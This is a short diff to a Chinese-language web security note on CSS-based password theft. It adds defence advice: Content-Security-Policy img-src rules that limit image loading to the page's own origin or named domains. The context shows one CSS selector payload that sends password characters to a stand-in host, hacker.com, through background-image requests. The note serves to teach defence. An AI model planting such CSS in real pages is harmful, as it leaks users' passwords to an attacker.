@@ -174,6 +174,10 @@
 
 - 防御：
     - 谨慎加载第三方css
+    - CSP 大法又来了：`Content-Security-Policy: img-src`指令指定图像和网站图标的有效来源
+        - 设置图片只能来至当前页面的源：`Content-Security-Policy: img-src 'self'`
+        - 设置图片只能来至指指定站点源：`Content-Security-Policy: img-src https://*.futunn.com https://*.futu5.com`
+        - 其他的源会被浏览器拦截，无法进行图片加载
 
 ```css
 input[type="password"][value$="1"] { background-image: url("http://www.hacker.com/1");
